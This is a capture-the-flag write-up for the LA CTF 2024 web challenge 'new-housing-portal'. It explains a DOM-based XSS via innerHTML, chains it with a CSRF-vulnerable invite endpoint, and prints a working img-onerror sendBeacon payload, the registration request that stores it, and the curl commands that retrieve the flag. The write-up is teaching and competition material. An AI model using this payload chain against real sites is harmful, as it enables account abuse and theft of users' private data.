# new-housing-portal

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Conclusion](#conclusion)

## Overview

- Solved by: @siunam
- Contributor: @obeidat.
- 214 solves / 368 points
- Author: r2uwu2
- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

After that old portal, we decided to make a new one that is ultra secure and not based off any real housing sites. Can you make Samy tell you his deepest darkest secret?

Hint - You can send a link that the admin bot will visit as `samy`.

Hint - Come watch the real Samy's talk if you are stuck!

Site - [new-housing-portal.chall.lac.tf](https://new-housing-portal.chall.lac.tf)

Admin Bot - [https://admin-bot.lac.tf/new-housing-portal](https://admin-bot.lac.tf/new-housing-portal)

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2024/images/Pasted%20image%2020240219113930.png)

## Enumeration

**Index page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2024/images/Pasted%20image%2020240219114017.png)

When we go to `/`, it redirected us to `/login/` with parameter `err=login required`.

Alright then, let's register a new account!

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2024/images/Pasted%20image%2020240219114727.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2024/images/Pasted%20image%2020240219114741.png)

**Burp Suite HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2024/images/Pasted%20image%2020240219114815.png)

When we clicked the "SIGN UP" button, it'll send a POST request to `/register` with parameter name `username`, `password`, `name`, and `deepestDarkestSecret`. The response will set a new cookie called `auth`, and with header `Location`'s value `/`, which redirects us to `/`.

After registering, we can go to "Find Roomates" (The "Roomates" is typo'd) and "View Invitations".

- "Find Roomates":

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2024/images/Pasted%20image%2020240219115204.png)

In here, we can find roommates with their username.

Hmm... Can I search for myself?

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2024/images/Pasted%20image%2020240219115250.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2024/images/Pasted%20image%2020240219115258.png)

I can!

**Burp Suite HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2024/images/Pasted%20image%2020240219115523.png)

When we hit "Enter", GET parameter name `q` will be appended to our URL search query. Then, it'll send a GET to `/user` with parameter `q=<username>` asynchronously.

After searching myself, we can try to invite myself:

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2024/images/Pasted%20image%2020240219115644.png)

**Burp Suite HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2024/images/Pasted%20image%2020240219115717.png)

When we clicked the "INVITE" button, it'll send a POST request to `/finder` with parameter `username=<username>`.

Now, since we have an invitation, we can view it via the "View Invitations" page!

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2024/images/Pasted%20image%2020240219115839.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2024/images/Pasted%20image%2020240219115901.png)

In here, the inviter's username and "Deepest Darkest Secret" is returned.

We can try to accept the invite by clicking the "ACCEPT" button:

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2024/images/Pasted%20image%2020240219120140.png)

Hmm... Looks like the web application doesn't allow accepting invites.

Also, according to the challenge's description, there's an "Admin Bot" link, where the bot will visit to our given URL. This kind of "bot" implemention is to simulate a real victim, so this challenge is typically about **client-side vulnerability**, such as **XSS (Cross-Site Scripting)**. 

There's not much we can do in here, let's read this web application's source code!

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2024/web/new-housing-portal/new-housing-portal.zip):**
```shell
┌[siunam♥Mercury]-(~/ctf/LA-CTF-2024/web/new-housing-portal)-[2024.02.19|12:02:51(HKT)]
└> file new-housing-portal.zip 
new-housing-portal.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
┌[siunam♥Mercury]-(~/ctf/LA-CTF-2024/web/new-housing-portal)-[2024.02.19|12:02:52(HKT)]
└> unzip new-housing-portal.zip 
Archive:  new-housing-portal.zip
  inflating: Dockerfile              
  inflating: package.json            
  inflating: package-lock.json       
   creating: src/
  inflating: src/index.html          
   creating: src/finder/
  inflating: src/finder/index.html   
  inflating: src/finder/style.css    
  inflating: src/finder/index.js     
  inflating: src/style.css           
  inflating: src/server.js           
   creating: src/request/
  inflating: src/request/index.html  
  inflating: src/request/style.css   
  inflating: src/request/index.js    
   creating: src/login/
  inflating: src/login/index.html    
  inflating: src/login/style.css     
  inflating: src/login/index.js
```

After reading the source code a little bit, we have the following findings.

**First, the flag is in the `samy` user's `deepestDarkestSecret`:**
```javascript
[...]
const users = new Map();
[...]Payload:
users.set('samy', {
  username: 'samy',
  name: 'Samy Kamkar',
  deepestDarkestSecret: process.env.FLAG || 'lactf{test_flag}',
  password: process.env.ADMINPW || 'owo',
  invitations: [],
  registration: Infinity
});
[...]
```

According to the challenge's description, **the admin bot will visit as user `samy`.**

So, **our goal is to get user `samy`'s `deepestDarkestSecret`.**

**`src/finder/index.js`:**
```javascript
const $ = q => document.querySelector(q);

$('.search input[name=username]').addEventListener('keydown', (e) => {
  if (e.key === 'Enter') {
    location.search = '?q=' + encodeURIComponent(e.target.value);
  }
});

const params = new URLSearchParams(location.search);
const query = params.get('q');
if (query) {
  (async () => {
    const user = await fetch('/user?q=' + encodeURIComponent(query))
      .then(r => r.json());
    if ('err' in user) {
      $('.err').innerHTML = user.err;
      $('.err').classList.remove('hidden');
      return;
    }
    $('.user input[name=username]').value = user.username;
    $('span.name').innerHTML = user.name;
    $('span.username').innerHTML = user.username;
    $('.user').classList.remove('hidden');
  })();
}
```

In here, when GET parameter name `q` is provided, it'll send a GET request to `/user` with parameter `q=<username>`:

**`src/server.js`, GET method route `/user`:**
```javascript
[...]
app.get('/user', (req, res) => {
  const query = req.query.q;

  if (!users.has(query)) {
    res.json({ err: 'username not found' });
    return;
  }

  const { username, name } = users.get(query);

  res.json({ username, name });
});
[...]
```

As you can see, it just return the user's `username` and `name` when parameter `q` is provided.

However, there's a vulnerability **after getting the results and display them**.

**Let's take a closer look at the code in `src/finder/index.js`:**
```javascript
if (query) {
  (async () => {
    const user = await fetch('/user?q=' + encodeURIComponent(query))
      .then(r => r.json());
    if ('err' in user) {
      $('.err').innerHTML = user.err;
      $('.err').classList.remove('hidden');
      return;
    }
    $('.user input[name=username]').value = user.username;
    $('span.name').innerHTML = user.name;
    $('span.username').innerHTML = user.username;
    $('.user').classList.remove('hidden');
  })();
}
```

As you can see, it has 1 sink (Dangerous function), which is `innerHTML`. And the sources (User controllable inputs) are our user's `name` and `username`.

**In `src/finder/index.html`, we can see class `name` and `username` in the `<span>` element:**
```html
    [...]
    <div class="search">
      <label>Payload:
        Username (enter to search)
        <input type="text" name="username">
      </label>
      <div class="err hidden"></div>
      <div class="user hidden">
        <p>Name: <span class="name"></span></p>
        <p>Username: <span class="username"></span></p>

        <form name="invite" action="/finder" method="POST">
          <input type="hidden" name="username">
          <input type="submit" value="Invite">
        </form>
      </div>
    </div>
    [...]
```

In the above JavaScript and HTML code, we can see that our user's `name` and `username` are not encoded/sanitized at all. Hence, **`/finder/` is vulnerable to DOM-based XSS**!

But wait... How can we exfiltrate `samy`'s `deepestDarkestSecret` (The flag)??

**`src/server.js`, POST method route `/finder`:**
```javascript
[...]
app.post('/finder', needsLogin, (req, res) => {
  const username = req.body.username?.trim();

  if (!users.has(username)) {
    res.redirect('/finder?err=' + encodeURIComponent('username does not exist'));
    return;
  }

  users.get(username).invitations.push({
    from: res.locals.user.username,
    deepestDarkestSecret: res.locals.user.deepestDarkestSecret
  });

  res.redirect('/finder?msg=' + encodeURIComponent('invitation sent!'));
});
[...]
```

When we invite someone, the endpoint **doesn't have any CSRF (Cross-Site Request Forgery) protection**! That being said, **this route is vulnerable to CSRF**!

Then, since we can read the `deepestDarkestSecret` in the "View Invitations" page, we can **exfiltrate `deepestDarkestSecret` by exploiting CSRF**!

## Exploitation

Armed with above information, we can now exfiltrate `samy`'s `deepestDarkestSecret`!

**Payload:**
```html
<img src=x onerror="navigator.sendBeacon('/finder', new URLSearchParams({username : '<username_here>'}))">
```

The above XSS payload will make the victim to send a new invite to our user. Then we can view our invitation and exfiltrate `deepestDarkestSecret`.

- Register a new user with XSS payload:

```http
POST /register HTTP/2
Host: new-housing-portal.chall.lac.tf
Content-Type: application/x-www-form-urlencoded

username=xss_user&password=pwd&name=<img+src%3dx+onerror%3d"navigator.sendBeacon('/finder',+new+URLSearchParams({username+%3a+'siunam321'}))">&deepestDarkestSecret=foobar
```

- Send the roomates finder link with our XSS user to the admin bot:

**Vulnerable DOM-based XSS URL:**
```
https://new-housing-portal.chall.lac.tf/finder/?q=xss_user
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2024/images/Pasted%20image%2020240219135217.png)

- Profit:

```shell
┌[siunam♥Mercury]-(~/ctf/LA-CTF-2024/web/new-housing-portal)-[2024.02.19|13:52:34(HKT)]
└> curl -s -H "Cookie: auth=s%3Asiunam321.iFI1fSuHn%2FEL82kiqJWOwsLCWpF%2Fts1HqJ4QesuNLi8" https://new-housing-portal.chall.lac.tf/invitation
{"invitations":[{"from":"siunam321","deepestDarkestSecret":"todo"},{"from":"siunam321","deepestDarkestSecret":"todo"},{"from":"samy","deepestDarkestSecret":"lactf{b4t_m0s7_0f_a77_y0u_4r3_my_h3r0}"}]}
```

**Beatified:** 
```shell
┌[siunam♥Mercury]-(~/ctf/LA-CTF-2024/web/new-housing-portal)-[2024.02.19|13:54:50(HKT)]
└> curl -s -H "Cookie: auth=s%3Asiunam321.iFI1fSuHn%2FEL82kiqJWOwsLCWpF%2Fts1HqJ4QesuNLi8" https://new-housing-portal.chall.lac.tf/invitation | jq -r '.invitations[2]["deepestDarkestSecret"]'
lactf{b4t_m0s7_0f_a77_y0u_4r3_my_h3r0}
```

- **Flag: `lactf{b4t_m0s7_0f_a77_y0u_4r3_my_h3r0}`**

- Trivia: Samy Kamkar found a stored XSS vulnerability on MySpace back in 2005, and exploited the vulnerability and spread the payload like a worm virus.

## Conclusion

What we've learned:

1. Stored XSS chained with CSRF